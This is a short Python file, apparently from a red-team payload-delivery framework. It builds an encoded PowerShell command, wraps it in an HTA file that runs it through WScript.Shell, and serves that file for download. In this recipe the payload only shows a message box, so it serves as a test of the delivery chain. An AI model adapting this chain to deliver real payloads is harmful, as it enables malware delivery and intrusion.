from typing import List

from make.htmlsmuggling.htmlsmuggling import makeHtmlSmuggling
from make.lnk.lnk import makeLnk
from make.iso.iso import makeIso
from make.powershell.powershell import *
from make.zip.zip import makeZip
from make.vbs.vbs import *
from make.hta.hta import *
from make.onenote.onenote import *
from make.bat.bat import *

from helpers import readFileContent, saveAceFile, makeAceFile
from model import AceFile, AceRoute
from web import serve



def recipe_3() -> List[AceRoute]:
    # MSHTA -> Powershell:MessageBox
    routes = []

    # PS-A
    psScript: AceStr = makePsScriptMessagebox()
    psCommand: AceStr = makePsEncodedCommand(psScript)

    # MSHTA
    #cmd: AceStr = AceStr("powershell.exe -EncodedCommand {}".format(psCommand))
    cmd: AceStr = makeCmdFromPsCommand(psCommand, isEncoded=True, fullpath=False)

    hta: AceStr = makeHtaFromCmdByJscriptWscriptShell(cmd)
    htaFile: AceFile = makeAceFile("test.hta", hta)  # not really needed

    containerServe: AceRoute = AceRoute('/test.hta', hta, download=True, downloadName='test.hta')
    routes.append(containerServe)

    # start
    return(routes)




